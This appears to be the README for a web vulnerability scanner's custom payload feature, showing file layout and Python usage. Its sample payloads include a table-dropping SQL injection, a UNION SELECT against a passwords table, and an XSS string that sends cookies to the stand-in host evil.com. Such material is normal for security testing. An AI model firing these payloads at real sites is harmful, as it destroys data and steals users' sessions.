# Custom Payload System - Quick Reference

## 📁 File Locations

```
scanner-core/
├── core/
│   └── payload_loader.py          # Payload loading utility
└── payloads/
    ├── sqli.txt                    # SQL Injection (45+ payloads)
    ├── xss.txt                     # XSS (40+ payloads)
    ├── path_traversal.json         # Path Traversal (35+ payloads)
    └── ssrf.txt                    # SSRF (20+ payloads)
```

## 🚀 Quick Start

### 1. Use Existing Payloads (Default)

All modules automatically load from default files:
```python
# Automatically uses sqli.txt
scanner = SQLiModule("https://example.com")
```

### 2. Add Your Own Payloads

**Create file:** `scanner-core/payloads/my_sqli.txt`
```txt
' OR 1=1; DROP TABLE users--
admin' UNION SELECT * FROM passwords--
```

**Use it:**
```python
scanner = SQLiModule(
    "https://example.com",
    custom_payloads=["sqli.txt", "my_sqli.txt"]
)
```

### 3. JSON Format

**Create file:** `scanner-core/payloads/advanced_xss.json`
```json
{
  "description": "Advanced XSS payloads",
  "payloads": [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>"
  ]
}
```

## 📊 Supported Modules

| Module | Default File | Custom Support |
|--------|-------------|----------------|
| **SQL Injection** | `sqli.txt` | ✅ |
| **XSS** | `xss.txt` | ✅ |
| **Path Traversal** | `path_traversal.json` | ✅ |
| **SSRF** | `ssrf.txt` | ✅ |

## 💡 Features

✅ **Auto-merge**: Combines default + custom payloads
✅ **Deduplication**: Removes duplicate payloads
✅ **Caching**: Fast repeated access
✅ **Comments**: Use `#` in .txt files
✅ **Two formats**: .txt and .json

## 📝 Example Usage

```python
from owasp.a03_injection import SQLiModule
from owasp.a03_xss import XSSModule

# SQL Injection with custom payloads
sqli = SQLiModule(
    target_url="https://example.com",
    custom_payloads=["sqli.txt", "my_custom_sqli.txt"]
)

# XSS with custom payloads
xss = XSSModule(
    target_url="https://example.com", 
    custom_payloads=["xss.txt", "advanced_xss.json"]
)

# Run scans
sqli_findings = sqli.scan(urls)
xss_findings = xss.scan(urls)
```

## 🎯 Payload Resources

Popular repositories:
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **SecLists**: https://github.com/danielmiessler/SecLists
- **FuzzDB**: https://github.com/fuzzdb-project/fuzzdb

---

**See `CUSTOM_PAYLOADS.md` for full documentation**
